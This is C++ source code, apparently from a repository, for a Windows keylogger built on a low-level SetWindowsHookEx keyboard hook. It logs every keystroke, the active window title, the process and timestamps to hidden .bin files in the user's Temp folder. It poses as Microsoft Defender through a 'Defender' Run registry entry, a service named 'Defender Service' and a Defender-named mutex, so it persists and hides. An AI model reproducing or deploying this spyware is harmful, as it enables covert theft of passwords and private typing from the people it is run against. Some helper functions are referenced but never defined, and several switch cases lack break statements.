// SetWindowsHookEx-Keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <Shlobj.h>
#include <psapi.h>

#include "time.h"
#include "string" 
#include <sstream>
#include <fstream>
#include <iostream>
#include <chrono>

// C:\ > sc create "Defender Service" binPath="C:\...\SetWindowsHookEx-Keylogger.exe -service"
// C:\>sc delete "Defender Service"

// KeyBoard hook handle in global scope
HHOOK KeyboardHook;
// Shift Key 
bool shift = FALSE;
// Windows Title Text -260 char-
WCHAR cWindow[1000];
// NULL is ok
HWND lastWindow = NULL;
// File Path
std::wstring fileName = L"C:\\test.txt";

std::ofstream logfile;

std::string HookCode(HWND hwnd, DWORD code, DWORD scanCode, BOOL caps, BOOL shift)
{
	//My::mystream << "code=" << code << ",shift=" << shift << ",caps=" << caps << std::endl;

	/*
	Translate the return code from hook and 
	return the std::string rep of the the code.
	ex. 0x88 -> "[SHIFT]"
	caps = Caps lock on
	shift = Shift key pressed
	WinUser.h = define statments
	LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	*/

	std::string key;

	{
		switch (code) // SWITCH ON INT
		{
			// Sleep Key
		case VK_SLEEP: key = "[SLEEP]"; break;
			// Num Keyboard 
		case VK_NUMPAD0:  key = "0"; break;
		case VK_NUMPAD1:  key = "1"; break;
		case VK_NUMPAD2: key = "2"; break;
		case VK_NUMPAD3:  key = "3"; break;
		case VK_NUMPAD4:  key = "4"; break;
		case VK_NUMPAD5:  key = "5"; break;
		case VK_NUMPAD6:  key = "6"; break;
		case VK_NUMPAD7:  key = "7"; break;
		case VK_NUMPAD8:  key = "8"; break;
		case VK_NUMPAD9:  key = "9"; break;
		case VK_MULTIPLY: key = "*"; break;
		case VK_ADD:      key = "+"; break;
		case VK_SEPARATOR: key = "-"; break;
		case VK_SUBTRACT: key = "-"; break;
		case VK_DECIMAL:  key = "."; break;
		case VK_DIVIDE:   key = "/"; break;
			// Function Keys
		case VK_F1:  key = "[F1]"; break;
		case VK_F2:  key = "[F2]"; break;
		case VK_F3:  key = "[F3]"; break;
		case VK_F4:  key = "[F4]"; break;
		case VK_F5:  key = "[F5]"; break;
		case VK_F6:  key = "[F6]"; break;
		case VK_F7:  key = "[F7]"; break;
		case VK_F8:  key = "[F8]"; break;
		case VK_F9:  key = "[F9]"; break;
		case VK_F10:  key = "[F10]"; break;
		case VK_F11:  key = "[F11]"; break;
		case VK_F12:  key = "[F12]"; break;
		case VK_F13:  key = "[F13]"; break;
		case VK_F14:  key = "[F14]"; break;
		case VK_F15:  key = "[F15]"; break;
		case VK_F16:  key = "[F16]"; break;
		case VK_F17:  key = "[F17]"; break;
		case VK_F18:  key = "[F18]"; break;
		case VK_F19:  key = "[F19]"; break;
		case VK_F20:  key = "[F20]"; break;
		case VK_F21:  key = "[F22]"; break;
		case VK_F22:  key = "[F23]"; break;
		case VK_F23:  key = "[F24]"; break;
		case VK_F24:  key = "[F25]"; break;
			// Keys
		case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
		case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
		case VK_BACK:    key = "[BACK]"; break;
		case VK_TAB:     key = "[TAB]"; break;
		case VK_CLEAR:   key = "[CLEAR]"; break;
		case VK_RETURN:  key = "[ENTER]"; break;
		case VK_SHIFT:   key = "[SHIFT]"; break;
		case VK_CONTROL: key = "[CTRL]"; break;
		case VK_MENU:    key = "[ALT]"; break;
		case VK_PAUSE:   key = "[PAUSE]"; break;
		case VK_CAPITAL: key = "[CAP-LOCK]"; break;
		case VK_ESCAPE:  key = "[ESC]"; break;
		case VK_SPACE:   key = "[SPACE]"; break;
		case VK_PRIOR:   key = "[PAGEUP]"; break;
		case VK_NEXT:    key = "[PAGEDOWN]"; break;
		case VK_END:     key = "[END]"; break;
		case VK_HOME:    key = "[HOME]"; break;
		case VK_LEFT:    key = "[LEFT]"; break;
		case VK_UP:      key = "[UP]"; break;
		case VK_RIGHT:   key = "[RIGHT]"; break;
		case VK_DOWN:    key = "[DOWN]"; break;
		case VK_SELECT:  key = "[SELECT]"; break;
		case VK_PRINT:   key = "[PRINT]"; break;
		case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
		case VK_INSERT:  key = "[INS]"; break;
		case VK_DELETE:  key = "[DEL]"; break;
		case VK_HELP:    key = "[HELP]"; break;
			// Windows Keys
		case VK_LWIN:     key = "[LWIN]"; break;
		case VK_RWIN:     key = "[RWIN]"; break;
		case VK_LSHIFT:   key = "[LSHIFT]"; break;
		case VK_RSHIFT:   key = "[RSHIFT]"; break;
		case VK_LCONTROL: key = "[LCTRL]"; break;
		case VK_RCONTROL: key = "[RCTRL]"; break;
		case VK_LMENU: key = "[LALT]"; break;
		case VK_RMENU: key = "[RALT]"; break;
			// OEM Keys with shift 
		case VK_OEM_1:      key = shift ? ":" : ";"; break;
		case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
		case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
		case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
		case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
		case VK_OEM_2:      key = shift ? "?" : "/"; break;
		case VK_OEM_3:      key = shift ? "~" : "`"; break;
		case VK_OEM_4:      key = shift ? "{" : "["; break;
		case VK_OEM_5:      key = shift ? "\\" : "|"; break;
		case VK_OEM_6:      key = shift ? "}" : "]"; break;
		case VK_OEM_7:      key = shift ? "'" : "'"; break; //TODO: Escape this char: "
		// Action Keys
		case VK_PLAY:       key = "[PLAY]";
		case VK_ZOOM:       key = "[ZOOM]";
		case VK_OEM_CLEAR:  key = "[CLEAR]";
		case VK_CANCEL:     key = "[CTRL-C]";

		default:
			DWORD processId = 0;
			DWORD threadId = GetWindowThreadProcessId(hwnd, &processId);

			HKL layout = GetKeyboardLayout(threadId);
			BYTE keyboardState[256];
			if (layout != NULL && GetKeyboardState(keyboardState))
			{
				WCHAR converted[256];
				int convertedSize = sizeof(converted) / sizeof(converted[0]);
				int toUnicodeResult = ToUnicodeEx(code, scanCode, keyboardState, converted, convertedSize, 0, layout);

				if (toUnicodeResult > 0) {
					std::vector<char> convertedVector(convertedSize);
					WideCharToMultiByte(CP_UTF8, 0, converted, -1, convertedVector.data(), convertedSize, NULL, NULL);
					key = convertedVector.data();
				}
			}

			if (0 == key.length())
			{
				std::stringstream ss;
				ss << "0x" << std::hex << code;
				key = "[UNK-KEY]" + ss.str();
			}
			break;
		}
	}
	return key;

}

std::string Dayofweek(int code)
{
	// Return Day of the year in text
	std::string name;
	switch (code)
	{
		case 0: name = "[SUNDAY]"; break;
		case 1: name = "[MONDAY]"; break;
		case 2: name = "[TUESDAY]"; break;
		case 3: name = "[WENSDAY]"; break;
		case 4: name = "[THURSDAY]"; break;
		case 5: name = "[FRIDAY]"; break;
		case 6: name = "[SATURDAY]"; break;
		default:
			name = "[UNKOWN]";
	}
	return name;
}

	void My::Debug(std::string string) {
		string += "\n";

		OutputDebugStringA(string.c_str());
		logfile << string.c_str();
		logfile.flush();
	}

	std::string My::GetProcessFileName(DWORD dwProcId)
	{
		CHAR moduleName[2048] = { 0 };
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
		GetModuleFileNameExA((HMODULE)hProc, NULL, moduleName, sizeof(moduleName) / sizeof(WCHAR));
		CloseHandle(hProc);

		return std::string(moduleName);
	}

	std::string My::GetWindowFileName(HWND hwnd) {
		DWORD dwProcId = 0;
		GetWindowThreadProcessId(hwnd, &dwProcId);
		std::string moduleName = GetProcessFileName(dwProcId);

		Debug((std::string("moduleName = ") + moduleName).c_str());

		return std::string("(") + std::to_string(dwProcId) + ") , " + moduleName;
	}
	 
	bool My::Test() {
		//GetWindowFileName(GetForegroundWindow());

		//return true;
		return false;
	}

	bool My::RunProcess(LPSTR lpCmdLine) {
		if (lstrlenA(lpCmdLine) == 0)
		{
			My::Debug("RunProcess: Nothing to run");
			return false;
		}
		
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		// Start the child process. 
		if (!CreateProcessA(
			NULL,           // No module name (use command line)
			lpCmdLine,      // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			0,              // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi             // Pointer to PROCESS_INFORMATION structure
		))
		{
			My::Debug("RunProcess: CreateProcess failed" + std::to_string(GetLastError()));
			return false;
		}

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return true;
	}
		
	bool My::UpdateRegistration(LPSTR lpCmdLine) {
		DWORD ret;

		std::string cmdLine(lpCmdLine);

		{
			const CHAR* cRunKeyName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
			const CHAR* cRunValueName = "Defender";
			const CHAR* cDefaultValueName = NULL;

			LONG res = 0;
			DWORD dataType = REG_NONE;
			ULONG ucbValue = 0;

			if (std::string::npos != cmdLine.find("-register"))
			{
				std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";

				HKEY hkeyRun = NULL;
				if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, cRunKeyName, 0, KEY_READ | KEY_WRITE, &hkeyRun))
				{
					RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));

					RegCloseKey(hkeyRun);
					hkeyRun = NULL;
				}

				return true;
			}
			else
				if (std::string::npos != cmdLine.find("-run"))
				{
					My::DefenderRunCommand();
					return true;
				}
				else
					if (std::string::npos != cmdLine.find("-quit"))
					{
						My::DefenderQuit();
						return true;
					}
					else
						if (std::string::npos != cmdLine.find("-unregister"))
						{
							HKEY hkeyRun = NULL;
							if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, cRunKeyName, 0, KEY_READ | KEY_WRITE, &hkeyRun))
							{
								RegDeleteValueA(hkeyRun, cRunValueName);

								RegCloseKey(hkeyRun);
								hkeyRun = NULL;
							}
			   
							return true;
						}

		}

		return false;
	}

	bool My::Service(LPSTR lpCmdLine) {
		std::string cmdLine(lpCmdLine);

		if (std::string::npos != cmdLine.find("-service"))
		{
			Debug("Service: Calling SampleServiceMain");
			SampleServiceMain(0, NULL);
			return true;
		}

		return false;
	}


boolean HookKeyboard()
{
	My::Debug("HookKeyboard:==>");

	PWSTR pwstrAppData = NULL;

	HRESULT hr = SHGetKnownFolderPath(
		FOLDERID_LocalAppData/*FOLDERID_AppDataProgramData*/,
		0,
		NULL,
		&pwstrAppData
	);

	if (hr != S_OK)
	{
		My::Debug(std::string("SHGetKnownFolderPath failed with ") + std::to_string(hr));
		return false;
	}

	long long timestamp = std::chrono::system_clock::now().time_since_epoch().count() / 1000000;
	fileName = std::wstring(pwstrAppData) + L"\\Temp\\kl" + std::to_wstring(timestamp) + L".bin";

	if (pwstrAppData) {
		CoTaskMemFree(pwstrAppData);
		pwstrAppData = NULL;
	}

	SetLastError(0);
	KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // low-level keyboard input events
		HookProcedure, // pointer to the hook procedure
		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
		NULL //desktop apps, if this parameter is zero
	);
	DWORD dwLastError = GetLastError();
	if (!KeyboardHook) {
		// Hook returned NULL and failed
		My::Debug(std::string("HookKeyboard: Failed to get handle from SetWindowsHookEx() dwLastError=") + std::to_string(dwLastError) + "\n");
	}

	My::Debug("HookKeyboard:<--");
	return KeyboardHook != 0;
}

void UnhookKeyboard()
{
	My::Debug(std::string("UnhookKeyboard:==> KeyboardHook=") + std::to_string((long)KeyboardHook));
	UnhookWindowsHookEx(KeyboardHook);
	My::Debug("UnhookKeyboard:<--");
}

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	/*
	SHORT WINAPI GetKeyState(
		_In_ int nVirtKeydasdsad
		);
	*/

	/* 
	WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
	LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
	*/
	// LowLevelKeyboardProc Structure 
	/*
	typedef struct tagKBDLLHOOKSTRUCT {
		DWORD     vkCode;
		DWORD     scanCode;
		DWORD     flags;
		DWORD     time;
		ULONG_PTR dwExtraInfo;
		} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT;
	*/
	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
	// Do the wParam and lParam parameters contain information about a keyboard message.
	if (nCode == HC_ACTION)
	{
		std::stringstream debug(std::string(""));

		std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
		bool caps = FALSE;		SHORT capsShort = GetKeyState(VK_CAPITAL);
		std::string outPut;
		std::stringstream temp;
		if (capsShort > 0)
		{
			// If the high-order b2it is 1, the key is down; otherwise, it is up
			caps = TRUE;
		}

		// Messsage data is ready for pickup
		// Check for SHIFT key
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			//My::mystream << "wParam=" << wParam << std::endl;

			// WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
			if (wParam == WM_KEYDOWN)
			{
				//My::mystream << "shift DOWN" << std::endl;
				shift = TRUE;
			}
			else 
			if (wParam == WM_KEYUP)
			{
				//My::mystream << "shift UP" << std::endl;
				shift = FALSE;
			}
			else
			{
				debug << "wParam shift UP" << std::endl;
				shift = FALSE;
			}
		}
		// Start Loging keys now we are setup
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			// Retrieves a handle to the foreground window (the window with which the user is currently working).
			HWND currentWindow = GetForegroundWindow();
			// Check if we need to write new window output
			if (currentWindow != lastWindow)
			{
				/*
				void WINAPI GetLocalTime(
					  _Out_ LPSYSTEMTIME lpSystemTime
					);
				typedef struct _SYSTEMTIME {
					WORD wYear;
					WORD wMonth;
					WORD wDayOfWeek;
					WORD wDay;
					WORD wHour;
					WORD wMinute;
					WORD wSecond;
					WORD wMilliseconds;
					} SYSTEMTIME, *PSYSTEMTIME;
				*/
				//LPSYSTEMTIME t;
				SYSTEMTIME t;
				GetLocalTime(&t);
				int day = t.wDay;
				int month = t.wMonth;
				int year = t.wYear;
				int hour = t.wHour;
				int min = t.wMinute;
				int sec = t.wSecond;
				int dayName = t.wDayOfWeek;
				// Build our output header
				temp << "\n\n[+] " << Dayofweek(dayName) << " - " << day << "/" << month << "/" << year << "  ";
				temp << hour << ":" << min << ":" << sec;
				outPut.append(temp.str());
				temp.clear();
				/*
				int WINAPI GetWindowText(
				  _In_  HWND   hWnd,
				  _Out_ LPTSTR lpString,
				  _In_  int    nMaxCount
				);
				*/

				HWND hwnd = GetForegroundWindow();
				int windowTextSize = sizeof(cWindow) / sizeof(cWindow[0]);
				int c = GetWindowTextW(hwnd, cWindow, windowTextSize);
				debug << c;
				std::vector<char> windowText(windowTextSize);
				WideCharToMultiByte(CP_UTF8, 0, cWindow, -1, &windowText[0], windowTextSize, NULL, NULL);

				std::string moduleName = My::GetWindowFileName(hwnd);

				temp << " - Current Window: " << std::string(windowText.begin(), windowText.end()) << "\n";
				temp << " - Current Process: " << moduleName << "\n\n";

				//outPut.append(temp.str());
				debug << temp.str() << std::endl;
				myfile << temp.str() << std::endl;
				// Setup for next CallBack
				lastWindow = currentWindow;
			}

			// Now capture keys
			if (p->vkCode)
			{
				//outPut.append(HookCode(p->vkCode, caps, shift));
				temp.clear();
				temp << HookCode(currentWindow, p->vkCode, p->scanCode, caps, shift);
				debug << temp.str();
				myfile << temp.str();
				if (p->vkCode == VK_RETURN)
				{
					myfile << std::endl;
				}
			}
			// Final output logic
		}

		myfile.close();

		My::Debug(debug.str());
	}
	// hook procedure must pass the message *Always*
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{

	logfile = std::ofstream(std::string(getenv("LOCALAPPDATA")) + "\\Temp\\logfile.bin", std::ios::out | std::ios::app | std::ios::binary);

	static char szUniqueNamedMutex[] = "com.defender.IsRunning";

	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");

	std::string strCmdLine(lpCmdLine);

	if (My::UpdateRegistration(lpCmdLine))
	{
		logfile.close();
		return 0;
	}

	if (My::Test()) {
		logfile.close();
		return 0;
	}

	if (My::Service(lpCmdLine)) {
		logfile.close();
		return 0;
	}

	PasswordRun(lpCmdLine);

	My::Debug("WinMain: Starting KeyCapture");

	/*
	HHOOK WINAPI SetWindowsHookEx(
	  _In_ int       idHook,
	  _In_ HOOKPROC  lpfn,
	  _In_ HINSTANCE hMod,
	  _In_ DWORD     dwThreadId
	);
	*/

	// Start the hook of the keyboard
	SetLastError(0);
	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		My::Debug("WinMain: Already running!!!");

		logfile.close();
		return 0;
	}
	else
	{
		My::Debug("WinMain: Setting up hook");
		if (HookKeyboard())
		{
			My::DefenderCreateWindow(hInstance);

			logfile.close();

			// http://www.winprog.org/tutorial/message_loop.html
			MSG Msg;
			while (GetMessage(&Msg, NULL, 0, 0) > 0)
			{
				TranslateMessage(&Msg);
				DispatchMessage(&Msg);
			}
		}
		UnhookKeyboard();
	}

	ReleaseMutex(hHandle);
	CloseHandle(hHandle);
	hHandle = 0;

	// Exit if failure
    return 0;
}

